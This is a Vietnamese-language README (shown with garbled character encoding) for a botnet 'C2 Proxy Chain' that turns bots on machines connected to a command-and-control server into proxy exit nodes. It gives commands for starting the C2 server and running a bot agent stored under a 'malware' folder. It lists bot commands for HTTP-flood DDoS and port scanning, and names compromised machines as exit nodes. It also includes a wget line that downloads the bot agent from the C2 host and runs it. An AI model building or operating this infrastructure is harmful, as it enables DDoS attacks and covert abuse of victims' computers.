# üöÄ C2 PROXY CHAIN SYSTEM

H·ªá th·ªëng C2 Proxy Chain ho√†n ch·ªânh cho ph√©p c√°c bot ƒë√£ k·∫øt n·ªëi ƒë·∫øn C2 server tr·ªü th√†nh "exit nodes" (ƒë·∫ßu ra Internet) cho proxy chain.

## üìã T·ªïng Quan

### Ki·∫øn Tr√∫c H·ªá Th·ªëng:
```
Client ‚Üí C2 Proxy Server ‚Üí Bot1/Bot2/Bot3... ‚Üí Internet
```

### C√°c Th√†nh Ph·∫ßn:
1. **C2 Proxy Server** - Server ch√≠nh nh·∫≠n proxy requests t·ª´ client
2. **Bot Proxy Agent** - Bot agent h·ªó tr·ª£ proxy forwarding
3. **Load Balancer** - C√¢n b·∫±ng t·∫£i gi·ªØa c√°c bot exit nodes
4. **Health Monitor** - Gi√°m s√°t s·ª©c kh·ªèe bot exit nodes
5. **Web Dashboard** - Giao di·ªán qu·∫£n l√Ω proxy
6. **Integration Test** - Test to√†n b·ªô h·ªá th·ªëng

## üõ†Ô∏è C√†i ƒê·∫∑t

### Y√™u C·∫ßu:
```bash
pip install flask flask-socketio requests psutil
```

### C·∫•u Tr√∫c File:
```
scripts/
‚îú‚îÄ‚îÄ c2_proxy_server.py          # C2 Proxy Server ch√≠nh
‚îú‚îÄ‚îÄ proxy_load_balancer.py      # Load Balancer & Health Monitor
‚îú‚îÄ‚îÄ proxy_web_dashboard.py      # Web Dashboard
‚îú‚îÄ‚îÄ proxy_integration_test.py   # Integration Test
‚îî‚îÄ‚îÄ README_C2_PROXY_CHAIN.md    # H∆∞·ªõng d·∫´n n√†y

bane/malware/
‚îî‚îÄ‚îÄ bot_agent.py                # Bot agent ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t
```

## üöÄ S·ª≠ D·ª•ng

### 1. Kh·ªüi ƒê·ªông C2 Proxy Server

```bash
# Kh·ªüi ƒë·ªông C2 proxy server
python3 scripts/c2_proxy_server.py --c2-host 0.0.0.0 --c2-port 7777 --proxy-port 8080
```

**Tham s·ªë:**
- `--c2-host`: IP c·ªßa C2 server (m·∫∑c ƒë·ªãnh: 0.0.0.0)
- `--c2-port`: Port cho bot connections (m·∫∑c ƒë·ªãnh: 7777)
- `--proxy-port`: Port cho client proxy requests (m·∫∑c ƒë·ªãnh: 8080)

### 2. K·∫øt N·ªëi Bot Agent

```bash
# Tr√™n m√°y bot
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

Bot s·∫Ω t·ª± ƒë·ªông:
- K·∫øt n·ªëi ƒë·∫øn C2 server
- B·∫≠t ch·∫ø ƒë·ªô proxy khi nh·∫≠n l·ªánh `ENABLE_PROXY_MODE`
- Tr·ªü th√†nh exit node cho proxy chain

### 3. C·∫•u H√¨nh Client Proxy

#### A. Browser (SwitchyOmega):
```
Proxy Server: C2_IP:8080
Protocol: HTTP
```

#### B. Command Line:
```bash
export http_proxy=http://C2_IP:8080
export https_proxy=http://C2_IP:8080

# Test proxy
curl http://httpbin.org/ip
```

#### C. Python:
```python
import requests

proxies = {
    'http': 'http://C2_IP:8080',
    'https': 'http://C2_IP:8080'
}

response = requests.get('http://httpbin.org/ip', proxies=proxies)
print(response.json())
```

### 4. Web Dashboard

```bash
# Kh·ªüi ƒë·ªông web dashboard
python3 scripts/proxy_web_dashboard.py --host 0.0.0.0 --port 5000
```

Truy c·∫≠p: `http://C2_IP:5000`

**T√≠nh nƒÉng Dashboard:**
- Real-time monitoring
- Bot management
- Connection statistics
- Load balancer control
- Health monitoring

## ‚öñÔ∏è Load Balancing

### C√°c Thu·∫≠t To√°n:

1. **Round Robin** - Lu√¢n phi√™n gi·ªØa c√°c bot
2. **Least Connections** - Ch·ªçn bot c√≥ √≠t k·∫øt n·ªëi nh·∫•t
3. **Health Based** - Ch·ªçn bot c√≥ health score cao nh·∫•t
4. **Response Time** - Ch·ªçn bot c√≥ response time th·∫•p nh·∫•t
5. **Weighted Round Robin** - Round robin v·ªõi tr·ªçng s·ªë
6. **Random** - Ch·ªçn ng·∫´u nhi√™n
7. **Region Aware** - ∆Øu ti√™n bot c√πng region
8. **Circuit Breaker** - Tr√°nh bot b·ªã l·ªói

### C·∫•u H√¨nh Load Balancer:

```python
# Trong c2_proxy_server.py
selected_bot = self.load_balancer.select_bot("round_robin")
```

## üè• Health Monitoring

### Health Score Calculation:
- **Response Time**: Th·ªùi gian ph·∫£n h·ªìi trung b√¨nh
- **Success Rate**: T·ª∑ l·ªá request th√†nh c√¥ng
- **Connection Count**: S·ªë k·∫øt n·ªëi hi·ªán t·∫°i
- **Last Seen**: Th·ªùi gian k·∫øt n·ªëi cu·ªëi

### Health Thresholds:
- **Excellent**: ‚â• 80
- **Good**: ‚â• 60
- **Warning**: ‚â• 30
- **Critical**: < 30

### Circuit Breaker:
- **Closed**: Bot ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng
- **Open**: Bot b·ªã l·ªói, t·∫°m th·ªùi kh√¥ng s·ª≠ d·ª•ng
- **Half-Open**: Bot ƒëang ƒë∆∞·ª£c test l·∫°i

## üß™ Testing

### Integration Test:

```bash
# Ch·∫°y to√†n b·ªô test suite
python3 scripts/proxy_integration_test.py --c2-host 127.0.0.1 --c2-port 7777 --proxy-port 8080
```

**C√°c Test:**
1. C2 Proxy Server Startup
2. Bot Agent Connection
3. Proxy Functionality
4. Load Balancer
5. Health Monitoring
6. Web Dashboard
7. Stress Testing
8. Error Handling

### Manual Testing:

```bash
# Test proxy v·ªõi curl
curl --proxy http://C2_IP:8080 http://httpbin.org/ip

# Test v·ªõi multiple requests
for i in {1..10}; do
    curl --proxy http://C2_IP:8080 http://httpbin.org/ip
done
```

## üìä Monitoring & Statistics

### Real-time Stats:
- Total requests
- Bytes transferred
- Active connections
- Bot count
- Health scores
- Response times

### Bot Information:
- Bot ID
- Hostname
- Status (online/offline)
- Proxy mode
- Requests handled
- Bytes transferred
- Health score

### Load Balancer Stats:
- Strategy usage
- Selection success rate
- Bot recommendations
- Circuit breaker states

## üîß Troubleshooting

### Common Issues:

#### 1. Bot Kh√¥ng K·∫øt N·ªëi:
```bash
# Ki·ªÉm tra C2 server
netstat -tlnp | grep 7777

# Ki·ªÉm tra bot connection
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

#### 2. Proxy Kh√¥ng Ho·∫°t ƒê·ªông:
```bash
# Ki·ªÉm tra proxy port
netstat -tlnp | grep 8080

# Test proxy connection
curl --proxy http://C2_IP:8080 http://httpbin.org/ip
```

#### 3. Load Balancer Kh√¥ng Ch·ªçn Bot:
```bash
# Ki·ªÉm tra bot status
curl http://C2_IP:5000/api/bots

# Ki·ªÉm tra load balancer
curl http://C2_IP:5000/api/load_balancer
```

#### 4. Health Score Th·∫•p:
```bash
# Ki·ªÉm tra bot health
curl http://C2_IP:5000/api/status

# Restart bot n·∫øu c·∫ßn
pkill -f bot_agent.py
python3 bane/malware/bot_agent.py --c2-host C2_IP --c2-port 7777
```

### Debug Mode:

```bash
# C2 Proxy Server v·ªõi debug
python3 scripts/c2_proxy_server.py --c2-host 0.0.0.0 --c2-port 7777 --proxy-port 8080

# Web Dashboard v·ªõi debug
python3 scripts/proxy_web_dashboard.py --host 0.0.0.0 --port 5000 --debug
```

## üîí Security

### Recommendations:

1. **Firewall Rules:**
```bash
# Ch·ªâ cho ph√©p k·∫øt n·ªëi t·ª´ trusted IPs
ufw allow from TRUSTED_IP to any port 7777
ufw allow from TRUSTED_IP to any port 8080
ufw allow from TRUSTED_IP to any port 5000
```

2. **Authentication:**
- Th√™m authentication cho web dashboard
- S·ª≠ d·ª•ng API keys cho bot connections
- Implement rate limiting

3. **Encryption:**
- S·ª≠ d·ª•ng HTTPS cho web dashboard
- Encrypt communication gi·ªØa C2 v√† bot
- Implement certificate pinning

4. **Monitoring:**
- Log t·∫•t c·∫£ proxy requests
- Monitor unusual traffic patterns
- Set up alerts cho health issues

## üìà Performance Optimization

### Tuning Parameters:

1. **Connection Limits:**
```python
# Trong c2_proxy_server.py
max_connections = 100  # Per bot
max_clients = 1000     # Total clients
```

2. **Buffer Sizes:**
```python
# Trong bot_agent.py
BUFFER_SIZE = 4096
```

3. **Timeouts:**
```python
# Connection timeout
CONNECTION_TIMEOUT = 10
# Request timeout
REQUEST_TIMEOUT = 30
```

### Scaling:

1. **Horizontal Scaling:**
- Deploy multiple C2 servers
- Use load balancer for C2 servers
- Implement server clustering

2. **Vertical Scaling:**
- Increase server resources
- Optimize database queries
- Use connection pooling

## üöÄ Advanced Features

### 1. Multi-Region Support:
```python
# Register bot v·ªõi region
lb.register_bot("bot1", {
    'max_connections': 50,
    'weight': 1,
    'region': 'us-east'
})
```

### 2. Custom Load Balancing:
```python
# Implement custom strategy
def custom_strategy(self, client_region=None):
    # Custom logic here
    return selected_bot
```

### 3. Auto-Scaling:
```python
# Auto-scale based on load
if total_connections > threshold:
    deploy_new_bot()
```

### 4. Analytics:
```python
# Collect detailed analytics
analytics = {
    'request_patterns': [],
    'performance_metrics': {},
    'user_behavior': {}
}
```

## üìù API Reference

### C2 Proxy Server API:

#### Start Server:
```bash
POST /api/start_server
{
    "c2_host": "0.0.0.0",
    "c2_port": 7777,
    "proxy_port": 8080
}
```

#### Stop Server:
```bash
POST /api/stop_server
```

#### Get Status:
```bash
GET /api/status
```

#### Get Bots:
```bash
GET /api/bots
```

#### Send Bot Command:
```bash
POST /api/bot_command
{
    "bot_id": "bot_123",
    "command": "INFO"
}
```

### Bot Agent Commands:

#### Enable Proxy Mode:
```
ENABLE_PROXY_MODE
```

#### Proxy Request:
```
PROXY_REQUEST:connection_id:target_host:target_port:is_https
```

#### Health Check:
```
HEALTH_CHECK:
```

#### System Info:
```
INFO
```

#### DDoS Attack:
```
DDoS:HTTP_FLOOD:target.com:60
```

#### Port Scan:
```
SCAN:PORTS:192.168.1.1
```

## üéØ Use Cases

### 1. Anonymous Browsing:
- Route traffic qua multiple bot exit nodes
- Hide real IP address
- Bypass geo-restrictions

### 2. Load Testing:
- Distribute load across multiple bots
- Test application performance
- Simulate real user traffic

### 3. Penetration Testing:
- Use compromised machines as exit nodes
- Test network security
- Perform reconnaissance

### 4. Content Delivery:
- Distribute content via bot network
- Reduce server load
- Improve performance

## üìû Support

### Logs:
```bash
# C2 Server logs
tail -f /var/log/c2_proxy_server.log

# Bot agent logs
tail -f /var/log/bot_agent.log

# Web dashboard logs
tail -f /var/log/proxy_dashboard.log
```

### Configuration:
```bash
# Edit configuration
nano scripts/c2_proxy_server.py

# Reload configuration
pkill -f c2_proxy_server.py
python3 scripts/c2_proxy_server.py
```

### Updates:
```bash
# Update bot agent
wget https://C2_IP:6666/bot_agent.py
python3 bot_agent.py --c2-host C2_IP --c2-port 7777
```

---

## üéâ K·∫øt Lu·∫≠n

H·ªá th·ªëng C2 Proxy Chain cung c·∫•p m·ªôt gi·∫£i ph√°p ho√†n ch·ªânh ƒë·ªÉ bi·∫øn c√°c bot ƒë√£ k·∫øt n·ªëi th√†nh proxy exit nodes. V·ªõi load balancing, health monitoring, v√† web dashboard, h·ªá th·ªëng ƒë·∫£m b·∫£o hi·ªáu su·∫•t cao v√† ƒë·ªô tin c·∫≠y.

**T√≠nh nƒÉng ch√≠nh:**
- ‚úÖ C2 Proxy Server v·ªõi multi-threading
- ‚úÖ Bot Agent h·ªó tr·ª£ proxy forwarding
- ‚úÖ Load Balancer v·ªõi 8 thu·∫≠t to√°n
- ‚úÖ Health Monitor v·ªõi circuit breaker
- ‚úÖ Web Dashboard real-time
- ‚úÖ Integration Test suite
- ‚úÖ Comprehensive documentation

**B·∫Øt ƒë·∫ßu ngay:**
```bash
# 1. Kh·ªüi ƒë·ªông C2 server
python3 scripts/c2_proxy_server.py

# 2. K·∫øt n·ªëi bot
python3 bane/malware/bot_agent.py --c2-host C2_IP

# 3. C·∫•u h√¨nh proxy
export http_proxy=http://C2_IP:8080

# 4. Test
curl http://httpbin.org/ip
```

Ch√∫c b·∫°n s·ª≠ d·ª•ng th√†nh c√¥ng! üöÄ
